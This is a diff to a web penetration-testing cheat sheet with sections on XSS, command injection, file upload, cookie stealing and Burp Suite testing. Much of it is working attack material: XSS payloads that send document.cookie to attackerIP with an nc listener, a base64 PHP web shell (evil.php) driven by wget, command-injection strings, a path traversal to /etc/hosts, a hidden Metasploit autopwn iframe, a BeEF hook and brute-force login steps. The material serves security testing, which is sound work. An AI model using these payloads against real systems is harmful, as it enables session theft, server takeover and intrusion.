@@ -29,7 +29,7 @@ TRACE     Used for debugging.
 # Browser Redirection
 
 <iframe SRC="http://attackerIP/report" height = "0" width ="0">
-hacker:  use Metasploit browser autopwn listening on hackerip
+hacker:  use Metasploit browser autopwn
 ------------------------------------------------------------------------------------------------------
 
 # Cisco Router
@@ -41,9 +41,16 @@ https://targetIP/level/x/exec/-/show
 # ColdFusion
 
 /CFIDE/administrator/ 
-/debug/cf_debugFr.cfm
 /CFIDE/debug/cf_debugFr.cfm
 /CFIDE/debug/cf_debugFr.cfm?userPage=../../etc/hosts
+/debug/cf_debugFr.cfm
+------------------------------------------------------------------------------------------------------
+
+# Command Injection
+
+<command>; ifconfig
+<command> && ifconfig
+“`/usr/bin/id`”		double quote, back tic, command, back tic, double quote
 ------------------------------------------------------------------------------------------------------
 
 # Cookie Security Issues - missing HttpOnly or Secure attribute
@@ -51,21 +58,31 @@ https://targetIP/level/x/exec/-/show
 HttpOnly - prevents JavaScript from accessing the cookie
 Secure - only send over an encrypted channel
 
-Firefox
-Cookies > View Cookie Information
+Firefox > Cookies > View Cookie Information
 HttpOnly cookie tells the browser if a Java scripts tries to access the cookie, the browser should not 
-return a value.
+  return a value.
 ------------------------------------------------------------------------------------------------------
 
 # Cookie Stealing
 
+<script>alert(document.cookie)</script>
+
 <script>new Image().src="http://attackerIP/test.php?"+ document.cookie;</script>
-hacker:  nc -lvp 80
+hacker: nc -lvp 80
 ------------------------------------------------------------------------------------------------------
 
-# File upload vuln
+# DOM
 
-Create a php file called evil.php 
+Document object model
+
+Page Source - pre DOM
+View Selection Source - post DOM
+Inspector - post DOM
+------------------------------------------------------------------------------------------------------
+
+# File Upload Vuln
+
+Create a PHP file called evil.php 
 <?php
 $cmd=$_GET["cmd"];
 $decode=base64_decode($cmd);
@@ -73,13 +90,10 @@ os.system($decode);
 ?>
 
 Once the malicious file is in place, pass base64 encoded commands to it, and get basic code execution 
-on the web server, as the "apache" user.
+  on the web server, as the "apache" user.
 
 wget -O output -o /dev/null www.target.com/photos/evil.php?cmd=$(echo id|base64)
-cat output
-
 wget -O output -o /dev/null www.target.com/photos/evil.php?cmd=$(echo ifconfig|base64)
-cat output
 ------------------------------------------------------------------------------------------------------
 
 # Fuzzing
@@ -177,6 +191,11 @@ Ampersand            &foo
 
 # XSS
 
+Injection into the html on the page in a blog:  <h1>test</h1>
+<script>alert(42)</script>
+<script>alert(‘XSS’)</script>
+Try using an HTML entity:  &lt;script&gt:
+
 Stored - example: guestbook
 <script>alert("XSS");</script>
 <script>alert(document.cookie);</script>
@@ -184,11 +203,63 @@ Stored - example: guestbook
 <script>new Image().src="http://attakerIP/test.php?output="+document.cookie;</script>
 
 curl http://target.com/login.php?user=`perl –e 'print "a" x 500'`
+
+# DOM Based XSS      <img src="x" onerror="alert(42)" />
+# BeEF               <script> src = "http://attackerIP:3000/hook.js"></script>
 ------------------------------------------------------------------------------------------------------
 
-# External How-To
+# Additional Guides
 
 http://bughunting.guide/a-gentle-introduction-to-cross-site-scripting-xss/
 http://bughunting.guide/discovering-xss-vulnerabilities-with-burp-intruder/
 https://nvisium.com/blog/2014/01/31/accurate-xss-detection-with-burpsuite/
 https://forum.bugcrowd.com/t/tutorial-injectx-to-find-xss/790
+------------------------------------------------------------------------------------------------------
+
+# Example Test
+
+Target > Scope > Include in Scope > select your URL > Edit > Host or IP range: remove ^
+
+Manually craw the app
+
+Target > Site map > Content > select all of the lines > RC > Highlight
+
+Spider the app
+
+Run Nikto
+
+Burp > Target > Site map > RC on root folder > Engagement tools > Discover content > Config > Target: check 
+  Directories only, and disable Recurse subdirectories
+Filenames: disable both long names
+Discovery Engine: Sensitive
+	Disable Copy content from suite site map
+	*** must use Burp wordlist, can save setting?
+
+RC on the very first request >  Send to intruder
+Clear
+Put your curser right after the / > click Add
+Payload Sets > Payload type: Runtime file
+Payload Options > Select file: sec lists > Discovery > Web_content > raft-medium-directories
+Start attack
+sort by Status
+	500 	Server message
+	405 	Method not allowed
+
+User-Agent Switcher
+Intruder > clear > select user agent string > Add
+Payload Options > Select file: sec lists > Discovery > Web_content > UserAgents.fuzz.txt
+Sort by Length > Response > Render
+
+Automated Discovery
+Target > Site map > select root folder > Actively scan this host > ??? > sort by URL
+Manually remove duplicates
+
+Test for account lockout
+Payload: Null payload : Generate 100 payloads.
+
+Brute force login
+Cluster bomb - multiple usernames/passwords using all combinations.
+	username - simple list
+	passwords - runtime file
+Sort by Length
+
